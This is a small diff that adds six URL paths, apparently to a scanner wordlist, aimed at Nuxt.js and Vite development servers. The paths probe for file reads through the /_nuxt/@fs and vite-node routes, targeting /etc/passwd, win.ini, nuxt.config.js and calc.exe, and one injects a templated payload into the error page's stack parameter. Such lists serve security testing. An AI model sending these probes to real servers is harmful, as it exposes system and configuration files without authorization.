@@ -1,0 +1,6 @@
+/_nuxt/@fs/etc/passwd
+/_nuxt/@fs/windows/win.ini
+/nuxt.config.js
+/__nuxt_vite_node__/module//bin/passwd
+/__nuxt_vite_node__/module/C:/Windows/System32/calc.exe
+/__nuxt_error?stack=%0A{{url_encode(payload)}}
